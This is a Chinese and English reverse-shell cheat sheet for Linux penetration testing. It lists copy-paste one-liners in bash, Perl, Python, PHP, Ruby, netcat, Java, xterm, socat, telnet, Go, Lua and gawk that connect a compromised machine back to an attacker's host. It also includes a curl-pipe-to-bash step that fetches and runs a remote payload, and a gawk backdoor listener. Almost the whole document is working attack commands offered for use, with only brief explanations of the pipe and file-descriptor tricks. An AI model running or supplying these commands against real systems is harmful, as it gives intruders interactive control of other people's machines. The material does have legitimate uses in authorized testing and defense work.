# linux反弹备忘录

If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.

If it’s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.

Your options for creating a reverse shell are limited by the scripting languages installed on the target system – though you could probably upload a binary program too if you’re suitably well prepared.

The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute “/bin/sh -i” with “cmd.exe”.

Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they’re quite short lines, but not very readable.

### Bash

Some versions of [bash can send you a reverse shell](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) (this was tested on Ubuntu 10.10):

```bash
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

```bash
bash -i > /dev/tcp/192.168.146.129/2333 0>&1 2>&1
```

```bash
bash -i >& /dev/tcp/192.168.146.129/2333 0>&1
```

```bash
bash -i >& /dev/tcp/192.168.146.129/2333 0<&1
```

```bash
bash -i >& /dev/tcp/192.168.146.129/2333 <&2
```

```bash
bash -i >& /dev/tcp/192.168.146.129/2333 0<&2
```

### exec

```shell
exec 5<>/dev/tcp/192.168.146.129/2333;cat <&5|while read line;do $line >&5 2>&1;done
```

### rm

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.146.129 2333 >/tmp/f
```

### PERL

Here’s a shorter, feature-free version of the [perl-reverse-shell](http://pentestmonkey.net/tools/web-shells/perl-reverse-shell):

```perl
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

There’s also an [alternative PERL revere shell here](http://www.plenz.com/reverseshell).

### Python

This was tested under Linux / Python 2.7:

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

### PHP

This code assumes that the TCP connection uses file descriptor 3.  This worked on my test system.  If it doesn’t work, try 4, 5, 6…

```php
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

If you want a .php file to upload, see the more featureful and robust [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell).

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

### Netcat

Netcat is rarely present on production systems and even if it is there are several version of netcat, some of which don’t support the -e option.

```shell
nc -e /bin/sh 10.0.0.1 1234
```

If you have the wrong version of netcat installed, [Jeff Price points out here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-127498) that you might still be able to get your reverse shell back like this:

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

### Java

```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

[Untested submission from anonymous reader]

### xterm

One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port 6001.

```shell
xterm -display 10.0.0.1:1
```

To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):

```shell
Xnest :1
```

You’ll need to authorise the target to connect to you (command also run on your host):

```shell
xhost +targetip
```

### Further Reading

Also check out [Bernardo’s Reverse Shell One-Liners](http://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html).  He has some alternative approaches and doesn’t rely on /bin/sh for his Ruby reverse shell.

There’s a [reverse shell written in gawk over here](http://www.gnucitizen.org/blog/reverse-shell-with-bash/#comment-122387).  Gawk is not something that I’ve ever used myself.  However, it seems to get installed by default quite often, so is exactly the sort of language pentesters might want to use for reverse shells.

### Curl

Kali开启apache服务，把bash命令写入html文件，只要文本包含bash一句话即可

```bash
bash -i >& /dev/tcp/192.168.2.102/7777 0>&1   # 将bash反弹木马写入html文件
curl 192.168.2.103/bash.html|bash   # 使用curl命令执行此shell
```

### Whois

whois反弹的shell只能执行后面带的命令

```shell
whois -h 192.168.2.102 -p 4444 `pwd`
```

### socat

```shell
socat file:`tty`,raw,echo=0 tcp-listen:9999  # 监听命令
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.2.102:9999  # 反弹命令
```

### telnet

```shell
mknod a p; telnet 10.211.55.2 7777 0<a | /bin/bash 1>a
```

```shell
telnet x.x.x.x 6666 | /bin/bash | telnet x.x.x.x 5555
```

### Xterm

```shell
# 在主控端配置
# 开启Xserver：　　# TCP 6001
Xnest :1                

# 授予目标机连回来的权限：
xterm -display 127.0.0.1:1          # Run this OUTSIDE the Xnest, another tab
xhost +targetip                         # Run this INSIDE the spawned xterm on the open X Server
# 如果想让任何人都连上：
xhost +                      

# 在受控端执行
# 假设xterm已安装，连回你的Xserver：
xterm -display attackerip:1
或者：
$ DISPLAY=attackerip:0 xterm
```

### 基于匿名管道（pipe）传递指令流

```shell
# client
nc 192.168.43.146 7777 | /bin/bash | nc 192.168.43.146 8888
# server
ncat -lvvp 7777
# server 
ncat -lvvp 8888
```

![img](https://github.com/linl-sec/linlsec.github.io/blob/main/images/Web%E5%AE%89%E5%85%A8/532548-20191215104646111-1137243959.png)

bash进程的输入输出都来自其他进程的pipe

### 基于命名管道（fifo）

fifo是命名管道也被称为FIFO文件，它是一种特殊类型的文件，它在文件系统中以文件名的形式存在（因为多个进程要识别），它的行为和匿名管道类似（一端读一端写），但是FIFO文件也不在磁盘进行存储。一般用于进程间的通信。

```shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 110.211.55.2 7777 >/tmp/f
```

- mkfifo 命令首先创建了一个管道
- cat 将管道里面的内容输出传递给/bin/sh
- sh会执行管道里的命令并将标准输出和标准错误输出结果通过 nc 传到该管道，由此形成了一个回路

## git解释性脚本语言反弹shell

### python反弹shell

```python
python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('ip',port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"

# 拆成多行方便阅读
import os,socket,subprocess
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('ip',port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/bash','-i'])
```

- 使用duo2方法将第二个形参（文件描述符）指向第一个形参（socket链接）
  - os.dup2(s.fileno(),0)
  - os.dup2(s.fileno(),1)
  - os.dup2(s.fileno(),2)
- 使用os的subprocess在本地开启一个子进程，启动bash交互模式，标准输入、标准输出、标准错误输出被重定向到了远程

### go反弹shell

```go
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

### lua反弹shell

```lua
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```

### gawk反弹shell

```shell
#!/usr/bin/gawk -f

BEGIN {
        Port    =       8080
        Prompt  =       "bkd> "

        Service = "/inet/tcp/" Port "/0/0"
        while (1) {
                do {
                        printf Prompt |& Service
                        Service |& getline cmd
                        if (cmd) {
                                while ((cmd |& getline) > 0)
                                        print $0 |& Service
                                close(cmd)
                        }
                } while (cmd != "exit")
                close(Service)
        }
}
```